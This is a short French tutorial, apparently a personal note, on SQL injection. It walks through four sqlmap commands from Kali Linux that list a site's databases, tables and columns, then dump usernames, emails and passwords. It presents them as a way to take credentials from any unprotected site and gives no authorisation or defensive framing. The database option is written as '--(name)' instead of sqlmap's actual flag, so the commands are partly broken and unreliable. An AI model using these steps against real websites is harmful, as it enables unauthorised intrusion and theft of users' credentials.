# faille SQL  

permet de contourner des mots de passe et autre faille dans une page web 
il peut etre placer dans un formulaire (car cela envoie une requete direct au serveur),dans des url,mais le moyen le plus efficace reste avec kali linux.
tout d abord il faut savoir que les base de donné sont en SQL et tout ce qui a un acces direct aux base de donné constitue une faille.
Je vais vous montré comment trouvé des identifiant dans n importe quelle site avec kali linux cela ne marche que si ces page n en sont pas proteger.

premiere commande , lister les database disponible dans le site :  

````bash
sudo sqlmap -u (l url de ton site) --dbs
````
- faire attention aux base de donné par defaut (ne pas les choisir)
  
deuxieme commande , obtenir les table disponible pour la basede donné choisis :

````bash
sudo sqlmap -u (l url de ton site) --(le nom de la base) --tables
````
troisieme commande , obtenir les columns disponible pour la table choisis :  

````bash
sudo sqlmap -u (l url de ton site) --(le nom de la base) -T (le nom de la table) --columns
````
quatrieme et derniere commande , recuperer les mots de passe ou les email ou les nom user ou les identifiant ou tout :  

````bash
sudo sqlmap -u (l url de ton site) --(le nom de la base) -T (le nom de la table) -C (case de la columns chosis),(encore),(encore),(etc) --dump
````
les les site avec beaucoup de dossier et fichier peuvent avoir une autre table (cdommande 3) a taper vous retaper la meme commande normalement c est le meme nom
vous avez pu voir les faille SQL avec kali linux.

